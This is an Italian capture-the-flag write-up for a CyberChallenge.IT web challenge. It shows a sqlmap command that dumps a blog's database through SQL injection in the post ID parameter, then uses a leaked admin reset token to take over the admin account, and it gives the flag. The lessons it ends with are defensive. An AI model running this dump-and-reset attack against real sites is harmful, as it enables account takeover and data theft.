# Writeup: WS_2.04 - yet another blog

## Descrizione 📝
Questo blog permette di visualizzare post in base all’ID, ma non effettua adeguati controlli sui parametri, consentendo un attacco di **SQL Injection**. L’obiettivo è ottenere l’accesso come **admin** (il cui username è già noto) e recuperare la flag.

## Soluzione 🎯

1. **Identificazione della Vulnerabilità**  
   - Sfruttiamo l’endpoint `GET /post.php?id=1` con **sqlmap**:
     ```bash
     sqlmap -u "http://yetanotherblog.challs.cyberchallenge.it/post.php?id=1" --dbs --dump
     ```
   - La query rivela la tabella con le credenziali, inclusi campi `username`, `email`, `reset_token`, e `password_hash`.

2. **Dati Estratti**  
   Esempio di riga (semplificata):
   ```
   username: admin
   email: admin@email.com
   reset_token: 35a124570810e55192aee55f71ce4d8a
   password_hash: $2y$10$zOmPZDYc2wu2U26y7FqKbeuVKpCMrGhA7IPDuY5e.OEXWTY/4qDcO
   ```
   Avendo il `reset_token` per l’utente `admin`, possiamo resettare la password.

3. **Reset della Password**  
   - Usando il `reset_token`, inviamo la richiesta di reset password.  
   - Scegliamo una nuova password a piacere.

4. **Login come Admin**  
   - Effettuiamo il login con `username=admin` e la password appena scelta.  
   - Il sito ci riconosce come admin e mostra la flag.

## Flag 🏁
```
CCIT{Hash_y0ur_r3s3t_t0ken_t00}
```

## Lezioni Apprese 📚
1. **SQL Injection**: Ancora una volta, la mancanza di parametri preparati consente di dumpare il database.  
2. **Reset Token**: Dovrebbe essere protetto (es. hashed) e scadere dopo un certo tempo; se esposto, chiunque può resettare la password.  
3. **Validazione Lato Server**: Non basta un endpoint di reset; bisogna proteggere i token e validare con attenzione l’input.

## Tools Utilizzati 🛠️
- **sqlmap**: Per automatizzare la SQL Injection e dumpare il database.  
- **Browser**: Per eseguire il reset password e accedere come admin.

---

*Writeup by Luca Crippa - Last Updated: 2024*
